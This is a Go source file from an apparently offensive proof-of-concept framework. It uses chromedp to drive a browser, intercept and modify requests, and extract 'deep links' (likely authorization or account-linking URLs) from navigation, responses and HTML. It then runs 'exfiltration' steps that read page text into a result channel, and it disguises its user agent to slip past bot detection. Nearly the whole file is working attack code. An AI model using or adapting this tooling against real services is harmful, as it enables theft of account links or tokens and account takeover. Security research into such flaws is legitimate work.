package attacks

import (
	"bufio"
	"context"
	"html"
	"log"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/fetch"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
)

// Set to true if the tool should attach to a pre-existing chrome session (needed to easily bypass bot detection sometimes)
var Attach bool = false

// Chrome url to attach to
var AttachUrl string = ""

// Used only in special cases for PoCs, does not support concurrency
func StartAttachedSession() {
	cmd := exec.Command("chromium", "--remote-debugging-port=9222")

	stderr, _ := cmd.StderrPipe()
	cmd.Start()

	scanner := bufio.NewScanner(stderr)
	scanner.Split(bufio.ScanWords)
	for scanner.Scan() {
		m := scanner.Text()
		if strings.HasPrefix(m, "ws") {
			AttachUrl = m
			return
		}
	}
	cmd.Wait()
}

func Visit(attack *Attack, comm chan AttackResult) {
	// Create chromedp context
	var ctx context.Context
	var cancel context.CancelFunc
	if AttachUrl != "" {
		ctx, cancel = chromedp.NewRemoteAllocator(context.Background(), AttachUrl)
	} else {
		opts := append(chromedp.DefaultExecAllocatorOptions[:],
			chromedp.Flag("headless", false),
			chromedp.Flag("incognito", true),
			// Used to bypass bot detection
			chromedp.UserAgent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3830.0 Safari/537.36"),
		)
		opts = append(opts, attack.CustomBrowserFlags...)
		ctx, cancel = chromedp.NewExecAllocator(context.Background(), opts...)
	}
	defer cancel()
	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	urlPattern := regexp.MustCompile(attack.Type.Regex)

	var attackResult AttackResult
	// Set up request interception
	chromedp.ListenTarget(ctx, func(ev interface{}) {
		switch ev := ev.(type) {
		case *fetch.EventRequestPaused:
			// Used to modify requests
			go func(ev *fetch.EventRequestPaused) {
				c := chromedp.FromContext(ctx)
				e := cdp.WithExecutor(ctx, c.Target)
				var fetchRequest *fetch.ContinueRequestParams
				// If we have a request interceptor, run it
				if attack.RequestInterception != nil {
					fetchRequest = attack.RequestInterception(ev)
				} else {
					fetchRequest = fetch.ContinueRequest(ev.RequestID)
				}
				if err := fetchRequest.Do(e); err != nil {
					log.Printf("Failed to continue request: %v", err)
				}
			}(ev)
		case *network.EventRequestWillBeSent:
			// Used to intercept navigation
			if urlPattern.MatchString(ev.Request.URL) {
				log.Printf("Intercepted link: %s\n", ev.Request.URL)
				attackResult = attack.Result(attack.Type.Extract(ev.Request.URL))
				comm <- attackResult
			}
		case *network.EventResponseReceived:
			// Used to extract from response
			go func() {
				c := chromedp.FromContext(ctx)
				body, err := network.GetResponseBody(ev.RequestID).Do(cdp.WithExecutor(ctx, c.Target))
				if err != nil {
					return
				}
				content := string(body)
				var link string
				// Custom extaction can be used where useful parameters are returned but no full deep link
				if attack.CustomExtraction == nil {
					link = attack.Type.Extract(content)
				} else {
					link = attack.CustomExtraction(content, ev.Response.URL)
				}
				if link != "" {
					log.Printf("Extracted from response link: %s\n", link)
					attackResult = attack.Result(link)
					comm <- attackResult
				}
			}()
		}
	})

	var content string
	// Used as backup to extract from HTML
	customAction := chromedp.ActionFunc(func(ctx context.Context) error {
		link := attack.Type.Extract(html.UnescapeString(content))
		if link != "" {
			log.Printf("Extracted from HTML link: %s\n", link)
			attackResult = attack.Result(link)
			comm <- attackResult
		}
		return nil
	})
	// Used to communicate data from a specific chromedp action and the main channel
	callbackAction := chromedp.ActionFunc(func(ctx context.Context) error {
		if len(GLOBAL_RESULT) > 0 {
			attackResult = attack.Result(GLOBAL_RESULT)
			comm <- attackResult
		}
		return nil
	})
	// Actions for navigating to target and starting attack
	actions := append(
		[]chromedp.Action{
			fetch.Enable(),
			network.Enable(),
			chromedp.Navigate(attack.Url),
		},
		attack.Actions...,
	)
	// Actions for deep link grabbing
	actions = append(
		actions,
		chromedp.OuterHTML(`html`, &content),
		customAction,
		callbackAction,
	)
	// Actions for exfiltrating data
	if attack.ExfilArea != "" {
		var exfilText string
		actions = append(actions, attack.ExfiltrationSteps...)
		actions = append(
			actions,
			chromedp.WaitVisible(attack.ExfilArea, chromedp.BySearch),
			chromedp.Text(attack.ExfilArea, &exfilText, chromedp.BySearch),
			chromedp.ActionFunc(func(ctx context.Context) error {
				if len(exfilText) > 0 {
					attackResult.ExfilChannel <- exfilText
				}
				return nil
			}),
		)
	} else {
		// Otherwise send an empty result
		actions = append(
			actions,
			chromedp.ActionFunc(func(ctx context.Context) error {
				attackResult.ExfilChannel <- ""
				return nil
			}),
		)
	}
	// Actions for waiting
	actions = append(actions, chromedp.Sleep(5*time.Minute))

	err := chromedp.Run(ctx, actions...)
	if err != nil {
		log.Println(err)
	}
}
